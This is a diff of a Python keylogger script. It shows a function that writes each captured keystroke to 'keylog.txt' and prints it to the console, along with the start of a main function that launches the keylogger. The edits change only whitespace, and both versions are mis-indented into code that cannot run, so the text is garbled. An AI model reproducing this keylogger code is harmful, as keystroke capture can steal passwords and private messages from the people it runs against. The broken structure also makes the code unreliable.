@@ -3,8 +3,7 @@
     import os  # Import os module for file handling
 
 # === LOG FILE CONFIGURATION ===
-LOG_FILE = "keylog.txt"  # File where keystrokes will be stored
-
+    LOG_FILE = "keylog.txt"  # File where keystrokes will be stored
     def log_key(key):
 """
     Function to log keystrokes into a file.
@@ -16,18 +15,18 @@ LOG_FILE = "keylog.txt"  # File where keystrokes will be stored
       # Get the character for normal keys (letters, numbers, symbols)
       
               key = key.char  
-   # Convert special keys (Shift, Enter, etc.) to string
-  except AttributeError:
-           key = str(key) 
+# Convert special keys (Shift, Enter, etc.) to string
+    except AttributeError:
+            key = str(key) 
     
   # Append the captured key to the log file
-    with open(LOG_FILE, "a") as file:
+     with open(LOG_FILE, "a") as file:
         file.write(key + " ")  # Save the keypress with spacing for readability
     
   # Print the key to the console in real-time
     print(key, end=" ", flush=True)
 
-def main():
+    def main():
     """
     Main function to initialize and start the keylogger.
     """
